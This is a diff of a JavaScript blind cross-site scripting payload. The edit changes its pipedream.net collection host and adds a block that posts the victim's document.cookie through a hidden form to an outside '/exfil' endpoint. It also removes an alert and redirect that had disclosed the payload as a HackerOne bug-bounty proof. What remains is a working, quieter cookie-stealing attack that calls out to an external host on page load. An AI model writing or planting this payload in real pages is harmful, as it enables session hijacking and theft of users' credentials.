@@ -1,6 +1,6 @@
 try {
   var elem = document.createElement('img');
-elem.src = 'https://encq9kzbey4y.x.pipedream.net/BLIND_XSS_TRIGGERED';
+elem.src = 'https://en90slubioxb.x.pipedream.net/BLIND_XSS_TRIGGERED';
 document.body.appendChild(elem);
   
   //https://stackoverflow.com/a/6169703
@@ -15,7 +15,7 @@ document.body.appendChild(elem);
   // construct a form with hidden inputs, targeting the iframe
   var form = document.createElement("form");
   form.target = uniqueString;
-  form.action = "https://encq9kzbey4y.x.pipedream.net/exfil";
+  form.action = "https://en90slubioxb.x.pipedream.net/exfil";
   form.method = "POST";
 
   f(form);
@@ -39,12 +39,13 @@ document.body.appendChild(elem);
   form.appendChild(input);
   }, "xfil2");
   
+    Exfil(function(form){
+   var input = document.createElement("input");
+  input.type = "hidden";
+  input.name = "cookies";
+  input.value = document.cookie;
+  form.appendChild(input);
+  }, "xfil3");
+  
 }catch(error) {  
 }
-
-try {
-  setTimeout(function(){
-alert('PROOF -> Blind XSS HIT. This is proof from 0-1@HackerOne. Please contact your security team.');
-document.location.href = "https://hackerone.com/reports/693776";
-  }, 1500);
-}catch(error) {}
